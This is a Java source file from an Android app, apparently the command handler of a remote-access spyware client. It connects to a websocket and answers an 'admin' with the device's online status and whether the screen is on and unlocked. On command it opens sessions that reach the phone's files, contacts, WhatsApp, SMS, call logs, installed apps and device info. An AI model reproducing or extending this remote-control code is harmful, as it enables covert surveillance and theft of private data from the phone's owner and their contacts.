package com.lyrnic.userside.managers;

import android.app.KeyguardManager;
import android.content.Context;
import android.net.ConnectivityManager;
import android.os.PowerManager;
import android.util.Log;

import com.lyrnic.userside.constants.Actions;
import com.lyrnic.userside.constants.Constants;
import com.lyrnic.userside.network.ActionsWebSocket;
import com.lyrnic.userside.sessions.CallLogsSession;
import com.lyrnic.userside.sessions.ContactsSession;
import com.lyrnic.userside.sessions.DeviceInfoSession;
import com.lyrnic.userside.sessions.FileManagerSession;
import com.lyrnic.userside.sessions.InstalledAppsSession;
import com.lyrnic.userside.sessions.SmsSession;
import com.lyrnic.userside.sessions.WhatsappSession;
import com.lyrnic.userside.utilities.ScreenUtils;

import org.json.JSONException;
import org.json.JSONObject;

public class ActionsManager {
    Context context;
    SessionManager sessionManager;
    ActionsWebSocket webSocket;


    public ActionsManager(Context context){
        Log.d("ActionsManager", "ActionsManager created");
        this.context = context;
        sessionManager = new SessionManager(context);
        webSocket = ActionsWebSocket.getInstance(TokenManager.getToken(context)
                , (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE));


        webSocket.setOnMessageListener(message -> {
            try {
                handleAction(message);
            } catch (JSONException e) {
                Log.e("ActionsManager", "error while parsing json", e);
            }
        });
        sessionManager.setOnRequestSendMessageListener(message -> {
            try {
                JSONObject jsonObject = new JSONObject(message);
                jsonObject.put(Constants.SENDER_TOKEN_KEY, TokenManager.getToken(context));
                webSocket.sendMessage(jsonObject.toString());
            } catch (JSONException e) {
                throw new RuntimeException(e);
            }
        });
        webSocket.connectWebSocket();

    }

    public SessionManager getSessionManager() {
        return sessionManager;
    }

    public void handleAction(String message) throws JSONException {
        JSONObject messageJson = new JSONObject(message);

        String action = messageJson.getString(Constants.ACTION_KEY);
        String senderToken = messageJson.getString(Constants.SENDER_TOKEN_KEY);

        switch (action){
            case Actions.ACTION_GET_STATE:
                webSocket.sendMessage(generateStateResponse(senderToken));
                break;
                case Actions.ACTION_GET_SCREEN_STATE:
                // Check if screen on or off
                // Return response to admin
                sendScreenStatus(senderToken);
                break;

            case Actions.ACTION_START_SESSION:
                // Start required session
                // Return response to admin
                // Response should contain session id
                int sessionSharedId = messageJson.getInt(Constants.SESSION_ID_KEY);
                String sessionType = messageJson.getString(Constants.SESSION_TYPE_KEY);
                int sessionId = sessionManager.createSession(getSessionClass(sessionType) ,senderToken);
                webSocket.sendMessage(generateSessionStartedResponse(senderToken, sessionId, sessionSharedId));
            default:
                // Not a simple action
                // Send it to opened sessions if any
                sessionManager.sendToSession(message);
        }
    }

    private void sendScreenStatus(String senderToken) throws JSONException {
        JSONObject screenState = new JSONObject();
        screenState.put(Constants.ACTION_KEY, Actions.ACTION_RECEIVE_SCREEN_STATE);
        screenState.put(Constants.STATE_KEY, ScreenUtils.isScreenOnAndUnlocked(context));
        screenState.put(Constants.SENDER_TOKEN_KEY, TokenManager.getToken(context));
        screenState.put(Constants.RECEIVER_TOKEN_KEY, senderToken);
        webSocket.sendMessage(screenState.toString());
    }


    public Class<?> getSessionClass(String sessionType){
        if(FileManagerSession.class.getSimpleName().equals(sessionType)){
            return FileManagerSession.class;
        }else if(ContactsSession.class.getSimpleName().equals(sessionType)){
            return ContactsSession.class;
        }else if(WhatsappSession.class.getSimpleName().equals(sessionType)){
            return WhatsappSession.class;
        } else if(SmsSession.class.getSimpleName().equals(sessionType)){
            return SmsSession.class;
        } else if(CallLogsSession.class.getSimpleName().equals(sessionType)){
            return CallLogsSession.class;
        } else if(InstalledAppsSession.class.getSimpleName().equals(sessionType)){
            return InstalledAppsSession.class;
        } else if (DeviceInfoSession.class.getSimpleName().equals(sessionType)) {
            return DeviceInfoSession.class;
        }
        return null;
    }

    public String generateStateResponse(String senderToken) throws JSONException {
        JSONObject state = new JSONObject();
        state.put(Constants.ACTION_KEY, Actions.ACTION_RECEIVE_STATE);
        state.put(Constants.STATE_KEY, "online");
        state.put(Constants.SENDER_TOKEN_KEY, TokenManager.getToken(context));
        state.put(Constants.RECEIVER_TOKEN_KEY, senderToken);
        return state.toString();
    }
    public String  generateSessionStartedResponse(String senderToken, int sessionId, int sessionSharedId) throws JSONException {
        JSONObject response = new JSONObject();
        response.put(Constants.ACTION_KEY, Actions.ACTION_SESSION_CREATED);
        response.put(Constants.SENDER_TOKEN_KEY, TokenManager.getToken(context));
        response.put(Constants.RECEIVER_TOKEN_KEY, senderToken);
        response.put(Constants.SESSION_ID_KEY, sessionId);
        response.put(Constants.SESSION_SHARED_ID_KEY, sessionSharedId);
        return response.toString();
    }

    public ActionsWebSocket getWebSocket() {
        return webSocket;
    }
}
